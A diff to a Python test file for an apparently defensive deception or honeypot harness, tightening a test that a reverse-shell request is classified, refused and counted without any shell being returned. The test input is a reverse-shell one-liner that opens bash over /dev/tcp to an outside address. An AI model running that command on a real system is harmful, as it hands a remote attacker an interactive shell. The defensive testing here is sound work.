@@ -13,8 +13,6 @@ import json
 import sys
 from pathlib import Path
 
-import pytest
-
 ROOT = Path(__file__).resolve().parent.parent
 sys.path.insert(0, str(ROOT / "harness" / "deception"))
 
@@ -59,7 +57,9 @@ def test_a_shell_request_is_answered_without_a_shell():
     out = s.send("bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n")
     assert out[0].classified_as == "reverse_shell_attempt"
     assert "Connection refused" in out[0].response
-    assert "bash" not in s.attempt_profile or True
+    # nothing that looks like an interactive shell is ever returned, and the attempt is counted
+    assert "no job control" not in out[0].response
+    assert s.attempt_profile["reverse_shell_attempt"] == 1
 
 
 def test_egress_is_synthetic_and_nothing_leaves_the_process():
